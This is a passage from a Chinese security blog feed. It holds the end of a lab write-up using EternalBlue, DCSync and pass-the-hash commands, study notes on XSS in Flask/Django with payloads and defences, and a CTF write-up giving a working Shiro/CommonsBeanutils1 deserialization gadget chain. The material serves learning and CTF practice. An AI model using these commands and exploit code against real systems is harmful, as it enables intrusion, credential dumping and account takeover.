class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>proxychains.conf<br></code></pre></td></tr></table></figure><p>唉，脚本小子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure><p>打完之后获得一个正向连接的<code>shell</code>：</p><p><img src="/img/4a1787360a997a7aed633f20182a264a.png" alt="4a1787360a997a7aed633f20182a264a"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250106143548762.png" alt="image-20250106143548762"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250106143621461.png" alt="image-20250106143621461"></p><p>拿到管理员哈希后打哈希传递：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">proxychains crackmapexec smb <span class="hljs-number">172.22</span>.<span class="hljs-number">1.2</span> -u administrator -H<span class="hljs-number">10</span>cf<span class="hljs-number">89</span>a<span class="hljs-number">850</span>fb<span class="hljs-number">1</span>cdbe<span class="hljs-number">6</span>bb<span class="hljs-number">432</span>b<span class="hljs-number">859164</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span> -d xiaorang.lab -<span class="hljs-keyword">x</span> <span class="hljs-string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/7b0b8313c4ee7d882a02161eebc7c09e.png" alt="7b0b8313c4ee7d882a02161eebc7c09e"></p><p>一边学一遍打一共花了五个多小时😪</p><p><img src="/img/image-20250106151323937.png" alt="image-20250106151323937"></p>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask/Django中的XSS</title>
    <link href="/2024/09/01/XSS-in-FlaskDjango/"/>
    <url>/2024/09/01/XSS-in-FlaskDjango/</url>
    
    <content type="html"><![CDATA[<p>学习笔记</p><span id="more"></span><h3 id="0x01-示例"><a href="#0x01-示例" class="headerlink" title="0x01 示例"></a>0x01 示例</h3><p><code>Flask</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Guest&#x27;</span>)<br>    html = <span class="hljs-string">f&quot;&lt;h1&gt;Hello, <span class="hljs-subst">&#123;user_input&#125;</span>!&lt;/h1&gt;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(html)<br><span class="hljs-comment">#反射型</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>令<code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>:</p><p><img src="/img/xss_1_1.png" alt="xss_1_1"></p><p>这里直接利用f-string 进行字符串插值，user_input 的值在插值时直接进入了最终的 HTML 输出</p><p>简单说就是用户的输入被当成合法的 HTML 和 JavaScript执行导致了未预期的行为</p><p>解决方法就是利用<code>jinja2</code>模板渲染用户的输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#在 Flask 中，除非显式指明不转义，Jinja2会自动转义所有值。这样可以排除所有模板导致的 XSS 问题</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Guest&#x27;</span>)<br>    html = <span class="hljs-string">&quot;&lt;h1&gt;Hello, &#123;&#123; user_input &#125;&#125;!&lt;/h1&gt;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(html, user_input=user_input)<br></code></pre></td></tr></table></figure><p>这时令<code>http://127.0.0.1:5000/?name=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>：</p><p><img src="/img/xss_1_2.png" alt="xss_1_2"></p><p>看源码：</p><p><img src="/img/xss_1_3.png" alt="xss_1_3"></p><p>可以看到<code>&lt;</code>, <code>&gt;</code>, <code>&#39;</code>都被转义成了HTML实体(不是HTML语法的一部分)，浏览器不会将这些字符当作 HTML 或 JavaScript 来执行</p><p>自己定义转义也可以，不过要注意的是不光标签要做转义，单引号和双引号同样要做转义，若只转移了标签符号，确实没办法直接插入标签，不过对于：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;?= avatar_url ?&gt;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&lt;?= nickname ?&gt;&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&lt;?= nickname ?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>令<code>nickname = &quot; onload=&quot;alert(1)</code>去闭合<code>alt</code>标签，创造一个<code>onload</code>属性（<code>onload</code>属性属于<code>html</code>属性）：</p><p><code>&lt;img src=&quot;avatar_url&quot; alt=&quot;&quot; onload=&quot;alert(1)&quot; /&gt;&lt;div&gt;&quot; onload=&quot;alert(1)&lt;/div&gt;</code></p><p>那么如何显式指明不转义呢？可以通过<code>|safe</code>或<code>Markup</code>实现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">#存在xss.html，render_template(&#x27;xss.html&#x27;, name=name)<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Hello, &#123;&#123; name |safe &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = Markup(request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>))<br></code></pre></td></tr></table></figure><p>有一类 <code>XSS</code> 问题 <code>Jinja</code> 的转义无法阻止。 <code>a</code> 标记的 <code>href</code> 属性可以包含一个 <code>javascript: URI</code> 。如果没有正确保护，那么当点击它时浏览器将执行其代码。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;href_test.html&#x27;</span>, user_input=user_input)<br><br><span class="hljs-comment">#href_test.html:</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>    &lt;a href=<span class="hljs-string">&quot;&#123;&#123; user_input &#125;&#125;&quot;</span>&gt;click here&lt;/a&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><code>name=javascript:alert(1)</code></p><p><img src="/img/xss_1_4.png" alt="xss_1_4"></p><p>为什么会这样？</p><p><code>javascript: alert(&#39;1&#39;)</code> 是一种称为 <strong>JavaScript URL</strong> 的伪协议。这种 URL 以 <code>javascript:</code> 作为前缀，后面跟随一段 <code>JavaScript</code> 代码。点击链接时，浏览器会执行这段代码，而不是导航到一个新的页面</p><p>防御很简单，比如直接检测用户输入是不是<code>http</code>或者<code>https</code>开头就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    white_list_href = [<span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>]<br>    user_input = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-keyword">for</span> href <span class="hljs-keyword">in</span> white_list_href:<br>         <span class="hljs-keyword">if</span> user_input.startswith(href):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;href_test.html&#x27;</span>, user_input=user_input)<br>         <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者设置<code>CSP</code>。这东西其实就是告诉浏览器哪些来源的资源可以被载入，哪些不行。这个在第四部分详细记录。</p><h3 id="0x03-危害"><a href="#0x03-危害" class="headerlink" title="0x03 危害"></a>0x03 危害</h3><p> 个人认为XSS主要损害有两种：</p><ol><li>拿cookie&#x2F;csrf token</li><li>通过XSS进行某些重要操作(打API)</li></ol><p>拿cookie比较简单，就是利用<code>JS</code>中访问当前页面的<code>API</code> <code>document.cookie</code>:</p><p><img src="/img/xss_1_5.png" alt="xss_1_5"></p><p>对于这种攻击其实在设置cookie的时候令<code>HttpOnly=True</code>（Cookie 只能通过服务器端访问，不能通过 JavaScript 读取）即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">response.set_cookie(<span class="hljs-string">&#x27;session_id&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>,secure=<span class="hljs-literal">True</span>,httponly=<span class="hljs-literal">True</span>,samesite=<span class="hljs-string">&#x27;None&#x27;</span>)<br></code></pre></td></tr></table></figure><p>也能拿csrf token，比如在一个Django项目中表单存在如下字段:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;AJTIijF8AHYNngTRCMDlAMswYAvmrFvIUxAL9RzsveUVsJJk7OgcAptN3aHdJtqY&quot;&gt;<br></code></pre></td></tr></table></figure><p>如何拿到这个隐藏字段的值呢？可以利用：</p><p><code>alert(document.querySelector(&#39;input[name=&quot;csrfmiddlewaretoken&quot;]&#39;).value);</code></p><p><img src="/img/xss_1_6.png" alt="xss_1_6"></p><p>第二种就是打特定的API，比如执行如下<code>js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/change_cookie&#x27;</span>, <span class="hljs-literal">true</span>);<br>    xhr.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>; <br>    xhr.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response from /change_cookie:&#x27;</span>, xhr.<span class="hljs-property">responseText</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Failed to fetch /change_cookie:&#x27;</span>, xhr.<span class="hljs-property">statusText</span>);<br>      &#125;<br>    &#125;;<br>    xhr.<span class="hljs-title function_">send</span>();<br>  &#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="0x04-利用CSP防护XSS"><a href="#0x04-利用CSP防护XSS" class="headerlink" title="0x04 利用CSP防护XSS"></a>0x04 利用CSP防护XSS</h3><p>CSP 通过定义允许加载的资源（如脚本、样式、图片、框架等）的来源，限制浏览器可以执行哪些资源</p><p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs none">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;<br>#<br>    default-src 是 CSP 的一种指令，用于指定默认资源加载的来源，包括脚本、样式、图片、字体、Ajax 请求等。<br>    &#x27;self&#x27; 表示只允许从与当前网页相同的来源（即相同的域名、协议和端口）加载资源。<br>#<br>    script-src 是 CSP 的另一指令，专门用于控制 JavaScript 资源的加载。<br>    &#x27;self&#x27; 同样表示只能从当前网页的域名加载脚本文件。<br></code></pre></td></tr></table></figure><p><code>self</code> 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯。</p>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarOA_shiro反序列化学习</title>
    <link href="/2024/05/30/%E4%BB%8EPolarOA%E4%B8%80%E9%A2%98%E7%9C%8Bshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/"/>
    <url>/2024/05/30/%E4%BB%8EPolarOA%E4%B8%80%E9%A2%98%E7%9C%8Bshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>唉，学</p><span id="more"></span><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>前几天参加了<code>polarctf</code>，因为没怎么学过<code>shiro</code>导致当时<code>polarOA</code>这道<code>java</code>题没解出来，特此记录。</p><h3 id="0x02-PolarOA2-0"><a href="#0x02-PolarOA2-0" class="headerlink" title="0x02 PolarOA2.0"></a>0x02 PolarOA2.0</h3><p>这里直接放题目了：</p><p>进环境发现是个登录界面，抓包发现存在<code>RememberMe</code>字段，初步猜测考点是<code>shiro</code>：</p><p><img src="/img/polarOA_1.png" alt="polarOA_1"></p><blockquote><p>简单提下漏洞原理：</p><p>Apache Shiro框架的记住密码功能，用户登录后生成加密编码的cookie。服务端对记住密码产生的cookie进行base64解密，再进行AES解密，之后进行反序列化，导致了反序列化漏洞。</p><p>客户端：命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p><p>服务端：RememberMe Cookie值&#x3D;&gt;base64解密&#x3D;&gt;AES解密&#x3D;&gt;反序列化</p></blockquote><p>这样一来AES加密密钥至关重要，但使用工具无法获得密钥，爆破不出来(可能用了高版本<code>shiro</code>)：</p><p><img src="/img/polar_2.png" alt="polar_2"></p><p>因为不登陆就没法拿<code>cookie</code>值，想了想有没有其它方式获取<code>key</code>：</p><p><a href="https://xz.aliyun.com/t/9763">spring端点泄露</a></p><p>但当时尝试访问<code>url/actuator/env</code>和<code>url/env</code>直接进报错页面了，后来看<code>wp</code>才知道得先登录😟</p><p>弱口令 <code>admin</code>,<code>admin123</code>：</p><p><img src="/img/polaroa_3.png" alt="polaroa_3"></p><p>再访问<code>url/actuator/env</code>发现确实存在敏感信息泄露：</p><p><img src="/img/polaroa_4-17173185458225.png" alt="polaroa_4"></p><p><code>polar</code>这个靶场挺搞的，这里看到环境变量里已经有<code>flag</code>了，但交不上去(之前做那个XEE的题也是，<code>phpinfo</code>恩搜到了<code>flag</code>，但我就是交不上去🤬)：</p><p><img src="/img/polaroa_5.png" alt="polaroa_5"></p><p>然后通过 <code>/actuator/heapdump</code> 这个路由导出 <code>jvm </code>中的堆内存信息，去翻<code>shiro key</code>：</p><p><img src="/img/polaroa_7.png" alt="polaroa_7"></p><p><code>BV0oz7n9/LtRqn1RENB+Yw==</code>可用</p><p>但这里存在问题，探测利用链发现无可利用链：</p><p><img src="/img/polaroa_6.png" alt="polaroa_6"></p><p>这里去看了出题人的博客：</p><blockquote><p>爆破所有利用链发现，没有可利用的链（其实不是，没有爆破出来是因为对Cookie长度做了限制，可测试出传入Cookie的字符串需要小于约3500个字符）</p></blockquote><p><code>Shiro</code>是依赖于<code>commons-beanutils</code>的，比如对于如下<code>pom.xml</code>，我并没有引入任何有关<code>cb</code>的依赖，但却可以发现通过引入<code>shiro 1.2.4</code>间接引入<code>cb1.8.3</code>:</p><p><img src="/img/polaroa_9.png" alt=""></p><p>接下来有两个问题：</p><ul><li><p>没有<code>CC</code>依赖怎么打<code>shiro</code>反序列化？</p></li><li><p>需要缩短我们的<code>payload</code>，怎么缩短？</p></li></ul><p>第一个问题：</p><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">参考文章</a></p><p>先复习一下<code>CB1</code>这条链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TESTCB1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Clac.class&quot;</span>));<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-comment">// 创建新的队列，并添加恶意字节码</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//可以看下beanComparator的构造方法：这里把property的值设置为outputProperties，目的是调用getOutputProperties()这个方法</span><br>        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        <span class="hljs-comment">//serialize(queue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/polaroa_10.jpg" alt="polaroa_10"></p><p>注意<code>pom.xml</code>中的一些依赖，注意<code>CB</code>的版本要和<code>shiro</code>给的对上：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>好，那我们现在删掉这个cc依赖会发生什么？</p><p><img src="/img/polaroa_11.png" alt="polaroa_11"></p><blockquote><p>Exception in thread “main” java.lang.NoClassDefFoundError: org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;comparators&#x2F;ComparableComparator<br>    at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:81)<br>    at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:59)<br>    at TESTCB1.main(TESTCB1.java:20)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.comparators.ComparableComparator<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:387)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:418)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:359)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:351)</p></blockquote><p> <code>NoClassDefFoundError</code> 异常，找不到 